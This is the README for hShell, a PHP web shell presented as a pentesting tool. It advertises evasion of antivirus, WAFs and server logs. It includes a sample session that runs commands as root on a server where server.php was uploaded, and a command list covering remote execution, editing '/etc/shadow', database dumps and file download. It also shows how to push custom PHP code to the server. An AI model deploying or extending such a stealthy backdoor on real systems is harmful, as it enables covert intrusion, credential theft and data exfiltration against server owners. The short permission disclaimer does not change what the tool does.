# WHK hShell

Web-Shell for professional use as a pentester writed in <?php


## Advantage

- The core of the shell is on the client's side.
- It leaves no traces because the code is not stored on the server side.
- No server-side interventions are required to perform updates.
- Interpretable code sent from the client, this prevents the detection of the antivirus.
- Transport of obfuscated code for the prevention of WAF detection.
- The data transport uses HTTP / POST requests, prevents leaving traces in logs of WEB servers.
- Use random payload on the HTTP / POST body for prevention of WAF detection.
- Supports large amounts of code due to the sending of requests via multipart/form-data.


## How to use?

The php server script must be uploaded on the server to be controlled. Then you must run the client.php from the terminal and indicate the path of the server.php:

    whk@machine:~$ php client.php 
     -=[ Wellcome to H Shell 💀 v0.5 Alpha ]=-
    + Connect to url: https://whk.cl/server.php
    + Connecting ...
    + Connected!
    h-Shell:/home/whk.cl/public_html/> id
    uid=0(root) gid=0(root)
    hShell:/home/whk.cl/public_html/> exec ls -la
    total 1
    drwxrwxr-x.  5 whk.cl whk.cl  4096 Feb 10 17:33 .
    drwx------.  6 whk.cl whk.cl  4096 Oct  8 15:08 ..
    -rw-r--r--.  1 root   root    1388 Feb 10 21:38 server.php
    hShell:/home/whk.cl/public_html/> force-exec explicit ls -la
    total 1
    drwxrwxr-x.  5 whk.cl whk.cl  4096 Feb 10 17:33 .
    drwx------.  6 whk.cl whk.cl  4096 Oct  8 15:08 ..
    -rw-r--r--.  1 root   root    1388 Feb 10 21:38 server.php
    h-Shell:/home/whk.cl/public_html/> exit
    ! Bye.


## Commands available

    hShell:/> help
      Command             | Description
     ────────────────────────────────────────────────────────────── 
      connect [url]       : Connect to Server WebShell script.
      help                : Show help of the client.
      cat                 : Show the content of remote file.
      tail [file path]    : Read the last lines of specific file.
      cd [directory]      : Navigate to specific remote directory.
      shell [command]     : Execute a simple command in remote server using the           current remote path. Detect automatic available method on the server. See the call-exec command. Alias of exec and system commands.
      force-shell [method] [command] : Force execute a simple command in remote server using an specific php method in current path. Alias of force-exec and force-system commands. Available methods: system, exec, shell_exec, passthru, popen, proc_open, explicit (using double quotes `).
      edit [editor command] [file path] : Edit remote file with specific local command edtor, example: edit vi /etc/shadow
      nano [file path]    : Edit remote file with nano editor on the local system.
      vi [file path]      : Edit remote file with vi editor on the local system.
      vim [file path]     : Edit remote file with vim editor on the local system.
      gedit [file path]   : Edit remote file with gedit editor on the local system.
      notepad [file path] : Edit remote file with notepad editor on the local system.
      sublime [file path] : Edit remote file with sublime text editor on the local system.
      uninstall           : Uninstall the current WebShell on the server.
      install [file path] : Install the WebShell on the specific remote parh.
      mysql [host] [port] [user] [password] : Start an interative MySQL shell connection on the remote server.
      mysqldump [host] [port] [user] [password] [local file] : Make a dump from remote database to local file .sql
      download [remote path] [local path] : Download a backup of file or directory from server to local path.
      upload [local path] [remote path] : Upload a local file or directory to remote directory (maintains the same permits)
      rm [path]           : Delete the specific file or directory path.
      mkdir [path]        : Make a directory on the server.
      phpinfo             : Show the full info of the php, libraries and enviroments of the server.
      id                  : Show the full info of the current user and group on the server.
      ls                  : List files and folders of the current path on the server. Alias of ll and dir commands.
      shellpath           : Show the current local path of the WebShell server.
      pwd                 : Show the current local path on the server.
      uname               : Show the full info of the System Operative of the server.
      exit                : Exit of the client but not remove the WebShell on the server. See uninstall.  Alias of quit command.


## Execute own codes without modifying the server

You can create and execute your own codes made in PHP language by creating specific functions for it.

### Howto make a custom functions?

In the client.php make a specific conditional between:

    }
    else if(in_array($command, array('exit', 'quit')))
    {

For example:

    }
    else if(in_array($command, array('custom_command')))
    {
        $result = $this->sendBuffer('
            $result = "done!";
        ');
        
        if($echo)
        {
            echo $result."\n";
        }
        
        return $result;
    }
    else if(in_array($command, array('exit', 'quit')))
    {

Where `$result = "done!";` is your code that will run on the server. The `$result` is the variable for return the string of result to the client.

For large return messages use callbacks for prevent exhaust of memory on the client, example:

    }
    else if(in_array($command, array('custom_command')))
    {
        $result = $this->sendBuffer('
            for($i = 0; $i <= 50000; $i++)
            {
                echo 'FOO';
            }
        ', 'self::callbackCommandGenericFlush', true);
        echo "\n";
    }
    else if(in_array($command, array('exit', 'quit')))
    {

See the `', 'self::callbackCommandGenericFlush', true);` when `self::callbackCommandGenericFlush` is the callback for print each line in real time without keep the lines in a local variable. Note: the out of buffer is a raw `echo`, dont use `$return`.
For call your command only call this:

    hShell:/> custom_command

For arguments use `$argv`, is a array of arguments (separated by blank space). For join all arguments use `implde`, by example: `$argument = implode(' ', $argv)`.
For more help, show the source code or write a email to [me](whk@elhacker.net)


## Do not be bad
Use this script only under controlled environments where you have permission to execute it. There is no guarantee of its functionality or use, please proceed with discretion.


## How to contribute?

|METHOD                 |WHERE                                                                                        |
|-----------------------|---------------------------------------------------------------------------------------------|
|Donate                 |[Paypal](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=KM2KBE8F982KS) |
|Find bugs              |Using the [Issues tab](https://github.com/WHK102/hShell/issues)                              |
|Providing new ideas    |Using the [Issues tab](https://github.com/WHK102/hShell/issues)                              |
|Creating modifications |Using the [Pull request tab](https://github.com/WHK102/hShell/pulls)                         |
